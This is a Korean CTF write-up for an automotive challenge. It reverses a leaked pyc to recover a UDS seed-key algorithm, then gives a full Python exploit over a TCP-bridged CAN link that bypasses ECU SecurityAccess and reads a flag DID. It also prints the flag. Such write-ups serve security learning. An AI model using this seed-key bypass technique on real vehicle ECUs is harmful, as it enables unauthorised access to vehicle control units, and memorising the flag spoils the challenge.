---
ctf_name: "2026-NDIAS-automotiveiotCTF"
challenge_name: "Seed-Key Leak"
category: "misc"
difficulty: "medium"
author: "vestman828"
date: "2026-05-16"
tags: [CAN]
---

# Seed-Key Leak

## 문제 설명

> 2026-NDIAS-automotiveiotCTF에 Seed-Key Leak 문제입니다. Misc입니다.

## 풀이

### 분석

  - 대상: dealer_unlock.pyc 유출, SecurityAccess 우회 후 ECU 비밀(플래그) 읽기
  - 통신: tester 0x7E0 ↔ ECU 0x7E8
  - 목표: UDS 0x27 인증 후 DID 0x1337 조회

  핵심 아이디어

  - dealer_unlock.pyc 안에 seed→key 알고리즘이 들어있다.
  - connect.sh 내부 canproxy.py를 보면 원격과는 “TCP + CAN frame(16바이트)”로 브리지된다.
  - 즉, Linux vcan0 없이도 TCP 프로토콜을 직접 구현하면 UDS 요청을 보낼 수 있다.

  1) pyc 분석
  아래처럼 바이트코드를 확인해서 derive_key() 상수를 복원했다.

  python - << 'PY'
  from xdis.disasm import disassemble_file
  disassemble_file('dealer_unlock.pyc')
  PY

  복원된 로직:

  def derive_key(seed):
      x = seed ^ 0xA5C31F27
      x = rol32(x, 3)
      x = (x + 0x1F1F0101) & 0xffffffff
      x ^= 0xDEADBEEF
      x = ror32(x, 1)
      return x & 0xffffffff

  2) UDS 시퀀스

  - 10 03 (Extended Session)
  - 27 01 (Seed 요청)
  - 27 02 <key> (Key 전송)
  - 22 13 37 (플래그 DID 읽기)

  실제 응답:

  - 1003 -> 5003... (세션 진입 성공)
  - 2701 -> 6701 <seed>
  - 2702 <key> -> 6702 (인증 성공)
  - 221337 -> 621337 <flag_bytes>

### 익스플로잇

```python
#!/usr/bin/env python3
import socket
import struct
import sys
import time

REQ_ID = 0x7E0
RES_ID = 0x7E8


def rol32(v: int, c: int) -> int:
    v &= 0xFFFFFFFF
    c &= 31
    return ((v << c) | (v >> (32 - c))) & 0xFFFFFFFF


def ror32(v: int, c: int) -> int:
    v &= 0xFFFFFFFF
    c &= 31
    return ((v >> c) | (v << (32 - c))) & 0xFFFFFFFF


def derive_key(seed: int) -> int:
    x = seed ^ 0xA5C31F27
    x = rol32(x, 3)
    x = (x + 0x1F1F0101) & 0xFFFFFFFF
    x ^= 0xDEADBEEF
    x = ror32(x, 1)
    return x & 0xFFFFFFFF


class CanProxyClient:
    def __init__(self, host: str, port: int) -> None:
        self.sock = socket.create_connection((host, port), timeout=8)
        self.sock.settimeout(2)
        self._handshake()

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    def _send_control(self, control_type: int) -> None:
        self.sock.sendall((0).to_bytes(2, "big") + bytes([control_type]))

    def _recv_exact(self, size: int) -> bytes:
        chunks = []
        remain = size
        while remain > 0:
            c = self.sock.recv(remain)
            if not c:
                raise EOFError("connection closed")
            chunks.append(c)
            remain -= len(c)
        return b"".join(chunks)

    def _recv_message(self, timeout: float):
        old = self.sock.gettimeout()
        self.sock.settimeout(timeout)
        try:
            frame_len = int.from_bytes(self._recv_exact(2), "big")
            if frame_len == 0:
                return "control", self._recv_exact(1)[0]
            return "frame", self._recv_exact(frame_len)
        finally:
            self.sock.settimeout(old)

    def _handshake(self) -> None:
        self._send_control(1)  # PING
        deadline = time.time() + 5.0
        while time.time() < deadline:
            typ, payload = self._recv_message(max(0.1, deadline - time.time()))
            if typ == "control":
                if payload == 1:
                    self._send_control(2)  # PONG
                elif payload == 2:
                    return
        raise TimeoutError("handshake timeout")

    def send_can(self, can_id: int, data: bytes) -> None:
        if len(data) > 8:
            raise ValueError("CAN classic payload must be <= 8")
        frame = struct.pack("<IB3x8s", can_id, len(data), data.ljust(8, b"\x00"))
        self.sock.sendall((16).to_bytes(2, "big") + frame)

    def uds_request(self, req: bytes, timeout: float = 6.0) -> bytes:
        if len(req) > 7:
            raise ValueError("only single-frame request is supported")
        self.send_can(REQ_ID, bytes([len(req)]) + req + bytes(7 - len(req)))
        return self._recv_isotp_response(timeout)

    def _recv_isotp_response(self, timeout: float) -> bytes:
        deadline = time.time() + timeout
        while time.time() < deadline:
            typ, payload = self._recv_message(max(0.1, deadline - time.time()))
            if typ == "control":
                if payload == 1:
                    self._send_control(2)
                continue

            can_id, dlc, data = struct.unpack("<IB3x8s", payload[:16])
            data = data[:dlc]
            if can_id != RES_ID or not data:
                continue

            pci_type = (data[0] >> 4) & 0xF
            if pci_type == 0:  # single frame
                ln = data[0] & 0xF
                uds_payload = bytes(data[1 : 1 + ln])
                if (
                    len(uds_payload) >= 3
                    and uds_payload[0] == 0x7F
                    and uds_payload[2] == 0x78
                ):
                    continue
                return uds_payload

            if pci_type == 1:  # first frame
                total = ((data[0] & 0xF) << 8) | data[1]
                out = bytearray(data[2:])
                self.send_can(REQ_ID, b"\x30\x00\x00\x00\x00\x00\x00\x00")
                seq = 1
                while len(out) < total:
                    t2, p2 = self._recv_message(max(0.1, deadline - time.time()))
                    if t2 == "control":
                        if p2 == 1:
                            self._send_control(2)
                        continue
                    cid, dlc2, d2 = struct.unpack("<IB3x8s", p2[:16])
                    d2 = d2[:dlc2]
                    if cid != RES_ID or not d2 or ((d2[0] >> 4) & 0xF) != 2:
                        continue
                    if (d2[0] & 0xF) != (seq & 0xF):
                        continue
                    out.extend(d2[1:])
                    seq = (seq + 1) & 0xF
                return bytes(out[:total])

        raise TimeoutError("UDS response timeout")


def main() -> int:
    host = sys.argv[1] if len(sys.argv) >= 2 else "20.18.209.122"
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 13337

    cli = CanProxyClient(host, port)
    try:
        r = cli.uds_request(b"\x10\x03")
        print(f"[+] 1003 -> {r.hex()}")

        r = cli.uds_request(b"\x27\x01")
        print(f"[+] 2701 -> {r.hex()}")
        if not (len(r) >= 6 and r[0] == 0x67 and r[1] == 0x01):
            print("[-] seed response is invalid")
            return 1

        seed = int.from_bytes(r[2:6], "big")
        key = derive_key(seed)
        print(f"[+] seed=0x{seed:08X}, key=0x{key:08X}")

        r = cli.uds_request(b"\x27\x02" + key.to_bytes(4, "big"))
        print(f"[+] 2702 -> {r.hex()}")
        if r != b"\x67\x02":
            print("[-] security access failed")
            return 1

        r = cli.uds_request(b"\x22\x13\x37")
        print(f"[+] 221337 -> {r.hex()}")
        if len(r) >= 3 and r[:3] == b"\x62\x13\x37":
            flag = r[3:].decode(errors="replace")
            print(f"[+] FLAG: {flag}")
            return 0

        print("[-] DID 0x1337 read failed")
        return 1
    finally:
        cli.close()


if __name__ == "__main__":
    raise SystemExit(main())
```

## 플래그

```
flag{s33dk3y_r3v3rs3d}
```

## 배운 점

-
